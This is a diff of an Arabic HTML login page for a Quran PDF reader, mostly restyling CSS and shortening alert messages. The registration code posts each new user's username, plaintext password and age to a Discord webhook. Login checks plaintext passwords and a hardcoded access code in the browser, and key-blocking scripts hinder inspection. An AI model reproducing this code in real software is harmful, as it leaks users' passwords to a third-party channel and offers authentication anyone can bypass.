@@ -3,53 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المصحف الشريف - دخول آمن</title>
+    <title>اقرأ وارتقِ</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.min.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
 
     <style>
-        :root { --gold: #c5a059; --bg: #0a0a0a; --card-bg: rgba(20, 20, 20, 0.85); }
-        body, html { margin: 0; padding: 0; background: var(--bg); overflow-x: hidden; user-select: none; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: white; height: 100%; }
+        :root { --gold: #d4af37; --gold-hover: #f1c40f; --bg: #050505; }
+        body, html { margin: 0; padding: 0; background: var(--bg); overflow-x: hidden; user-select: none; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: white; height: 100%; }
         
-        /* شاشة تسجيل الدخول مع الصورة الخلفية الجديدة */
         #login-screen {
             height: 100vh; display: flex; align-items: center; justify-content: center;
-            /* استبدال الخلفية بالصورة المطلوبة مباشرة */
-            background-image: url('https://raw.githubusercontent.com/stmfreverstm-design/Pdf/main/raergeragrtgt.jpg');
+            background: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://raw.githubusercontent.com/stmfreverstm-design/Pdf/main/raergeragrtgt.jpg');
             background-size: cover; background-position: center; position: relative;
+            perspective: 1000px;
         }
         
-        /* طبقة حماية داكنة فوق الصورة لزيادة وضوح النص */
-        #login-screen::before { content: ""; position: absolute; inset: 0; background: rgba(0, 0, 0, 0.6); }
-        
-        /* بطاقة تسجيل الدخول مع تأثير الضبابية (Blur) */
         .card {
-            position: relative; background: var(--card-bg); padding: 30px;
-            border-radius: 20px; border: 1px solid rgba(197, 160, 89, 0.3); width: 360px; text-align: center;
-            backdrop-filter: blur(10px); /* تأثير الضبابية الخلفي */
-            box-shadow: 0 15px 35px rgba(0,0,0,0.7);
+            position: relative; background: rgba(15, 15, 15, 0.75); padding: 40px;
+            border-radius: 24px; border: 1px solid rgba(212, 175, 55, 0.2); width: 380px; text-align: center;
+            backdrop-filter: blur(20px); box-shadow: 0 25px 50px rgba(0,0,0,0.8);
+            transform: translateY(0); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            animation: fadeIn 1s ease-out;
         }
+        .card:hover { transform: translateY(-10px); border-color: var(--gold); box-shadow: 0 35px 60px rgba(212, 175, 55, 0.15); }
 
-        .tabs { display: flex; justify-content: space-around; margin-bottom: 25px; border-bottom: 1px solid #333; }
-        .tab { padding: 12px; cursor: pointer; color: #aaa; width: 50%; border-bottom: 2px solid transparent; transition: 0.3s; font-size: 15px; }
-        .tab.active { color: var(--gold); border-bottom: 2px solid var(--gold); font-weight: bold; }
+        .tabs { display: flex; justify-content: center; margin-bottom: 30px; gap: 20px; }
+        .tab { padding: 8px 20px; cursor: pointer; color: #777; transition: 0.4s; font-size: 16px; border-radius: 50px; background: rgba(255,255,255,0.03); }
+        .tab.active { color: #000; background: var(--gold); font-weight: bold; box-shadow: 0 4px 15px rgba(212, 175, 55, 0.4); }
 
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 8px; border: 1px solid #444; background: rgba(0, 0, 0, 0.5); color: #fff; box-sizing: border-box; text-align: center; outline: none; transition: 0.3s; font-size: 15px; }
-        input:focus { border-color: var(--gold); background: rgba(0, 0, 0, 0.8); }
+        .input-group { position: relative; margin: 15px 0; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(0, 0, 0, 0.4); color: #fff; box-sizing: border-box; text-align: center; outline: none; transition: 0.3s; font-size: 16px; }
+        input:focus { border-color: var(--gold); background: rgba(0, 0, 0, 0.6); box-shadow: 0 0 15px rgba(212, 175, 55, 0.1); transform: scale(1.02); }
         
-        button { width: 100%; padding: 15px; background: var(--gold); border: none; font-weight: bold; cursor: pointer; border-radius: 8px; color: #1a1a1a; margin-top: 15px; transition: 0.3s; font-size: 16px; text-transform: uppercase; letter-spacing: 1px; }
-        button:hover { background: #b08d4a; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(197, 160, 89, 0.3); }
+        button { width: 100%; padding: 16px; background: var(--gold); border: none; font-weight: bold; cursor: pointer; border-radius: 12px; color: #000; margin-top: 20px; transition: 0.4s; font-size: 17px; letter-spacing: 0.5px; position: relative; overflow: hidden; }
+        button:hover { background: var(--gold-hover); transform: scale(1.03); box-shadow: 0 8px 25px rgba(212, 175, 55, 0.4); }
+        button:active { transform: scale(0.98); }
 
-        #viewer-container { display: none; background: #111; min-height: 100vh; position: relative; }
-        #pdf-render-area { display: flex; flex-direction: column; align-items: center; padding: 30px 0; }
-        canvas { margin-bottom: 30px; box-shadow: 0 0 40px rgba(0,0,0,0.8); max-width: 95%; border: 1px solid #222; }
+        #viewer-container { display: none; background: #0f0f0f; min-height: 100vh; animation: fadeIn 0.8s ease; }
+        #pdf-render-area { display: flex; flex-direction: column; align-items: center; padding: 40px 0; gap: 30px; }
+        canvas { box-shadow: 0 20px 60px rgba(0,0,0,0.9); max-width: 90%; border-radius: 8px; transition: transform 0.3s; }
+        canvas:hover { transform: scale(1.01); }
         
-        #loading-text { color: var(--gold); font-size: 14px; display: none; margin-top: 15px; font-weight: bold; animation: pulse 1.5s infinite; }
+        #loading-text { color: var(--gold); font-size: 14px; display: none; margin-top: 20px; font-weight: bold; letter-spacing: 2px; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         
-        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
-        @media print { body { display: none !important; } }
+        .shimmer { position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: 0.5s; }
+        button:hover .shimmer { left: 150%; transition: 0.7s; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -58,15 +60,18 @@
         <div class="card">
             <div class="tabs">
                 <div id="tab-login" class="tab active" onclick="switchTab('login')">دخول</div>
-                <div id="tab-register" class="tab" onclick="switchTab('register')">إنشاء حساب</div>
+                <div id="tab-register" class="tab" onclick="switchTab('register')">جديد</div>
             </div>
             <div id="form-container">
-                <h3 id="form-title" style="color: var(--gold); margin: 0 0 20px 0; font-weight: 300; letter-spacing: 1px;">تسجيل دخول</h3>
-                <input type="text" id="user" placeholder="اسم المستخدم" autocomplete="off">
-                <input type="password" id="pass" placeholder="كلمة المرور" autocomplete="off">
-                <input type="number" id="age" placeholder="السن (العمر)" style="display:none;" autocomplete="off">
-                <input type="text" id="code" placeholder="كود التحقق الخاص بك" autocomplete="off">
-                <button id="main-btn" onclick="handleAuth()">دخول آمن</button>
+                <h2 id="form-title" style="color: var(--gold); margin-bottom: 25px; font-weight: 300;">اقرأ وارتقِ</h2>
+                <div class="input-group"><input type="text" id="user" placeholder="اليوزر"></div>
+                <div class="input-group"><input type="password" id="pass" placeholder="الباسورد"></div>
+                <div class="input-group"><input type="number" id="age" placeholder="السن" style="display:none;"></div>
+                <div class="input-group"><input type="text" id="code" placeholder="الكود"></div>
+                <button id="main-btn" onclick="handleAuth()">
+                    <span id="btn-text">دخول</span>
+                    <div class="shimmer"></div>
+                </button>
                 <div id="loading-text">جاري التحقق...</div>
             </div>
         </div>
@@ -98,18 +103,10 @@
         window.onload = function() {
             const savedUser = localStorage.getItem('auto_user');
             const savedToken = localStorage.getItem('auto_token');
-
             if (savedUser && savedToken) {
-                document.getElementById('loading-text').style.display = 'block';
-                document.getElementById('loading-text').innerText = "جاري الدخول التلقائي...";
-                
                 database.ref('sessions/' + savedUser).once('value').then((snap) => {
-                    if (snap.val() === savedToken) {
-                        loadSecurePDF();
-                    } else {
-                        localStorage.clear();
-                        document.getElementById('loading-text').style.display = 'none';
-                    }
+                    if (snap.val() === savedToken) loadSecurePDF();
+                    else localStorage.clear();
                 });
             }
         };
@@ -118,8 +115,7 @@
             currentMode = mode;
             document.getElementById('tab-login').classList.toggle('active', mode === 'login');
             document.getElementById('tab-register').classList.toggle('active', mode === 'register');
-            document.getElementById('form-title').innerText = mode === 'login' ? 'تسجيل دخول' : 'إنشاء حساب جديد';
-            document.getElementById('main-btn').innerText = mode === 'login' ? 'دخول آمن' : 'تسجيل وإرسال للواتساب';
+            document.getElementById('btn-text').innerText = mode === 'login' ? 'دخول' : 'إنشاء وإرسال';
             document.getElementById('age').style.display = mode === 'register' ? 'block' : 'none';
             document.getElementById('code').style.display = mode === 'login' ? 'block' : 'none';
         }
@@ -131,7 +127,7 @@
             const c = document.getElementById('code').value.trim();
             const loading = document.getElementById('loading-text');
 
-            if(!u || !p || (currentMode === 'register' && !age)) return alert("يرجى إكمال جميع الحقول المطلوب");
+            if(!u || !p || (currentMode === 'register' && !age)) return;
             loading.style.display = 'block';
 
             if (currentMode === 'register') {
@@ -139,18 +135,14 @@
                 fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: `🆕 **حساب جديد مكتمل**\n👤 الاسم: ${u}\n🔑 الباسورد: ${p}\n🎂 السن: ${age}` })
+                    body: JSON.stringify({ content: `🆕 **حساب جديد**\n👤 الاسم: ${u}\n🔑 الباسورد: ${p}\n🎂 السن: ${age}` })
                 });
-                alert("تم تسجيل الحساب! تواصل مع الإدارة الآن لتفعيله.");
-                window.location.href = `https://wa.me/201277742850?text=أريد تفعيل حسابي:\nاليوزر: ${u}\nالسن: ${age}`;
-                loading.style.display = 'none';
+                alert("تم الإرسال.. تواصل مع الإدارة");
+                window.location.href = `https://wa.me/201277742850?text=تفعيل:${u}-${age}`;
             } else {
                 database.ref('users/' + u).once('value').then((snap) => {
                     const data = snap.val();
-                    if(!data) { alert("اليوزر غير موجود، قم بإنشاء حساب أولاً."); loading.style.display = 'none'; }
-                    else if (data.password !== p) { alert("كلمة المرور غير صحيحة! ❌"); loading.style.display = 'none'; }
-                    else if (c !== "2534gfsw26ft2r72t75e2e7#_") { alert("كود التحقق غير صحيح."); loading.style.display = 'none'; }
-                    else {
+                    if(data && data.password === p && c === "2534gfsw26ft2r72t75e2e7#_") {
                         const token = getStrictToken();
                         database.ref('sessions/' + u).once('value').then((sess) => {
                             if (!sess.val() || sess.val() === token) {
@@ -160,10 +152,13 @@
                                     loadSecurePDF();
                                 });
                             } else {
-                                alert("عذراً، هذا الحساب مفتوح على جهاز آخر!");
+                                alert("الجهاز مسجل مسبقاً");
                                 loading.style.display = 'none';
                             }
                         });
+                    } else {
+                        alert("خطأ في البيانات");
+                        loading.style.display = 'none';
                     }
                 });
             }
@@ -184,11 +179,9 @@
             }
         }
 
-        // منع الحركات غير المصرح بها
         document.addEventListener('contextmenu', e => e.preventDefault());
         window.addEventListener('keydown', e => {
-            if (e.ctrlKey && ['s','p','u','i','j','c'].includes(e.key.toLowerCase())) e.preventDefault();
-            if (e.keyCode === 123) e.preventDefault();
+            if (e.ctrlKey || e.keyCode === 123) e.preventDefault();
         });
     </script>
 </body>
